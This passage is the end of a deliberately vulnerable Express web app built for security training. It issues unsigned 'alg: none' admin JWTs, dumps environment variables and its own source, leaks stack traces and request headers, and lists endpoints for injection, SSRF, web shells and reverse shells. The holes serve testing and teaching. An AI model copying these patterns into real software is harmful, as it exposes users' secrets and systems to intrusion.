    secrets: ['key1', 'key2', 'key3']
  });
});

// ==========================================
// JWT VULNERABILITIES
// ==========================================

app.get('/jwt', (req, res) => {
  const { user } = req.query;

  // VULN: Weak JWT implementation
  const header = Buffer.from(JSON.stringify({ alg: 'none', typ: 'JWT' })).toString('base64');
  const payload = Buffer.from(JSON.stringify({
    user: user || 'guest',
    role: 'admin',
    exp: Date.now() + 3600000
  })).toString('base64');

  res.json({
    token: `${header}.${payload}.`,
    algorithm: 'none',
    vulnerabilities: [
      'Accepts alg: none',
      'No signature verification',
      'Weak secret if signed',
      'No token expiration check'
    ]
  });
});

// ==========================================
// DEBUG ENDPOINTS
// ==========================================

app.get('/debug', (req, res) => {
  res.json({
    env: process.env,
    cwd: process.cwd(),
    platform: process.platform,
    nodeVersion: process.version,
    memoryUsage: process.memoryUsage(),
    uptime: process.uptime(),
    pid: process.pid
  });
});

app.get('/source', (req, res) => {
  // VULN: Source code disclosure
  fs.readFile(__filename, 'utf8', (err, data) => {
    if (err) {
      return res.status(500).json({ error: err.message });
    }
    res.type('text/plain').send(data);
  });
});

// ==========================================
// VULNERABILITY SUMMARY
// ==========================================

app.get('/vulns', (req, res) => {
  res.json({
    title: 'Vulnerable OWASP App - Vulnerability List',
    categories: {
      'A01:2021 - Broken Access Control': [
        'GET /profile/:id - IDOR',
        'POST /login - Weak authentication',
        'GET /admin - Cookie-based auth bypass'
      ],
      'A02:2021 - Cryptographic Failures': [
        'GET /encrypt - Weak encryption',
        'POST /register - Plaintext passwords',
        'GET /config - Exposed secrets'
      ],
      'A03:2021 - Injection': [
        'GET /users - SQL Injection',
        'POST /auth - SQL Injection login bypass',
        'GET /ping - Command Injection',
        'GET /dns - Command Injection',
        'GET /file - Command Injection',
        'POST /search - NoSQL Injection',
        'GET /ldap - LDAP Injection',
        'GET /xpath - XPath Injection'
      ],
      'A04:2021 - Insecure Design': [
        'POST /reset-password - Predictable tokens',
        'GET /security-questions - Weak questions',
        'POST /verify-code - No rate limiting'
      ],
      'A05:2021 - Security Misconfiguration': [
        'GET /config - Exposed configuration',
        'GET /error - Stack traces',
        'GET /files - Directory listing',
        'GET /defaults - Default credentials'
      ],
      'A06:2021 - Vulnerable Components': [
        'POST /merge - Prototype pollution',
        'POST /deserialize - Insecure deserialization',
        'GET /fetch - SSRF',
        'GET /proxy - Internal SSRF'
      ],
      'A07:2021 - Auth Failures': [
        'GET /session - Session fixation',
        'POST /brute - Brute force vulnerable',
        'POST /change-password - Weak policy'
      ],
      'A08:2021 - Integrity Failures': [
        'GET /download - Path traversal, no integrity',
        'GET /deploy - Insecure CI/CD'
      ],
      'A09:2021 - Logging Failures': [
        'POST /log - Log injection',
        'GET /debug-logs - Sensitive data in logs',
        'GET /audit - No monitoring'
      ],
      'A10:2021 - SSRF': [
        'POST /webhook - SSRF via webhook',
        'GET /pdf - SSRF via PDF generation'
      ],
      'XSS': [
        'GET /search-xss - Reflected XSS',
        'POST /comments - Stored XSS',
        'GET /comments - XSS rendering',
        'GET /dom-xss - DOM XSS'
      ],
      'File Upload': [
        'POST /upload - No validation',
        'GET /uploads/:filename - Path traversal'
      ],
      'XXE': [
        'POST /xml - XML External Entity'
      ],
      'Path Traversal': [
        'GET /read-file - Directory traversal'
      ],
      'Open Redirect': [
        'GET /redirect - Open redirect',
        'GET /login-redirect - Open redirect via next'
      ],
      'Reverse Shell': [
        'GET /shell - Reverse shell commands',
        'GET /reverse-shell - Multiple payloads',
        'POST /webshell - Web shell',
        'GET /cmd - Command execution'
      ],
      'API': [
        'PUT /users/:id - Mass assignment',
        'GET /api/v1/users - Overly permissive',
        'POST /graphql - Query injection'
      ],
      'CORS': [
        'GET /api/data - CORS misconfiguration'
      ],
      'JWT': [
        'GET /jwt - Weak JWT (alg: none)'
      ],
      'Debug': [
        'GET /debug - System info leak',
        'GET /source - Source code disclosure'
      ]
    }
  });
});

// Error handler with stack traces
app.use((err, req, res, next) => {
  // VULN: Detailed error exposure
  res.status(500).json({
    error: err.message,
    stack: err.stack,
    path: req.path,
    method: req.method,
    body: req.body,
    query: req.query,
    headers: req.headers
  });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
  console.log(`⚠️  VULNERABLE APP running on port ${PORT}`);
  console.log('🔒 This application contains INTENTIONAL vulnerabilities');
  console.log('📚 For security testing and education ONLY');
});
